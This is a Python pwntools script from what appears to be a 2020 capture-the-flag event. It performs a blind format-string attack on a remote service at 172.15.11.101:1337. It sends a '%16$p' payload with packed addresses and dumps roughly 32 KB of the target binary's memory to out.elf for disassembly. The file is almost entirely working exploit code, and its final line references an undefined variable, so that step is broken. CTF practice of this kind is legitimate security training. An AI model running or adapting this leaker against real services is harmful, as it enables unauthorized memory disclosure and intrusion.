#msfctf 2020 trial error for blind fmt string attack
import pwn
from pwn import *
def fmtleaker(addr):
    pwn.log.debug("leaking addr 0x{:x}".format(addr))
    vp = None
    for i in range(3):
        try:
            pl =  "ABCD%16$pDCBA"
            pl += p64(addr)

            if "\n" in pl:
                log.warning("newline in payload!")
                return None
            
            vp = remote("172.15.11.101", 1337, timeout=1)
            vp.recv()
            vp.sendline("2")
            print(vp.recvline())
           
            vp.sendline(pl)
            print(vp.recvline())
            x = vp.recvline()

            if x:
                f = x.find("ABCD") + 4
                l = x.find("DCBA")
                res = x[f:l]
                if res == "":
                    return "\x00"
                else:
                    return res

            return None
        except KeyboardInterrupt:
            raise
        except EOFError:
            pwn.log.debug("got EOF for leaking addr 0x{:x}".format(addr))
            pass
        except Exception:
            pwn.log.warning("got exception...", exc_info=sys.exc_info())
        finally:
            if vp:
                vp.close()
    return None

leaked = ""
base_addr = 0x400000
if __name__ == "__main__":
    while len(leaked) < 32000:
        addr = base_addr + len(leaked)
        x = fmtleaker(addr)
        if x:
            leaked  += x
        else:
            leaked += "\xff"
        if len(leaked) % 128 == 0:
            
            with open("out.elf", "wb") as f:
                f.write(leaked)
    pwn.disasm(data,arch='amd64')

